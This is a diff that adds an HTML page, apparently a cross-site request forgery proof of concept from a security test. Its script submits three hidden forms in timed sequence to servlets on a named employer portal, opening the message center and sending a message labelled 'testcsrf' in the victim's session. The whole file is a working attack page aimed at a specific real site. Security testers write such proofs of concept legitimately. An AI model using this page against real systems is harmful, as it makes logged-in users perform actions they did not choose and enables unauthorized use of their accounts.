@@ -1,0 +1,64 @@
+<html>
+<body>
+
+<button onclick="attack()">Click</button>
+
+<!-- REQUEST 1 -->
+<form id="req1"
+      action="https://employertest.opers.org/PersECS/servlet/InitialServlet"
+      method="GET"
+      target="tab1">
+  <input type="hidden" name="serviceid" value="Employer_ECSUSERMessageCenter">
+</form>
+
+<!-- REQUEST 2 -->
+<form id="req2"
+      action="https://employertest.opers.org/PersECS/servlet/EmpMsgCenterMsgDetailsServlet"
+      method="POST"
+      target="tab2">
+  <input type="hidden" name="pageID" value="/EmpMsgCenterInboxList.jsp">
+  <input type="hidden" name="MessageId" value="">
+  <input type="hidden" name="UserAction" value="NewMessage">
+  <input type="hidden" name="JSPTOKEN" value="">
+  <input type="hidden" name="parentExpanded" value="false">
+</form>
+
+<!-- REQUEST 3 -->
+<form id="req3"
+      action="https://employertest.opers.org/PersECS/servlet/EmpMsgCenterSubmitServlet"
+      method="POST"
+      target="tab3">
+  <input type="hidden" name="pageID" value="/EmpMsgCenterViewDetail.jsp">
+  <input type="hidden" name="UserAction" value="newSend">
+  <input type="hidden" name="MessageId" value="">
+  <input type="hidden" name="JSPTOKEN" value="">
+  <input type="hidden" name="category" value="180">
+  <input type="hidden" name="msgDesc" value="">
+  <input type="hidden" name="subject" value="testcsrf">
+  <input type="hidden" name="messageBody" value="testcsrf">
+  <input type="hidden" name="button" value="Message Text Insert">
+</form>
+
+<script>
+function attack() {
+
+  // 1️⃣ Request 1 → new tab
+  window.open("about:blank", "tab1");
+  document.getElementById("req1").submit();
+
+  // 2️⃣ Request 2 → new tab (after delay)
+  setTimeout(function () {
+    window.open("about:blank", "tab2");
+    document.getElementById("req2").submit();
+  }, 3000);
+
+  // 3️⃣ Request 3 → new tab (after delay)
+  setTimeout(function () {
+    window.open("about:blank", "tab3");
+    document.getElementById("req3").submit();
+  }, 6000);
+}
+</script>
+
+</body>
+</html>
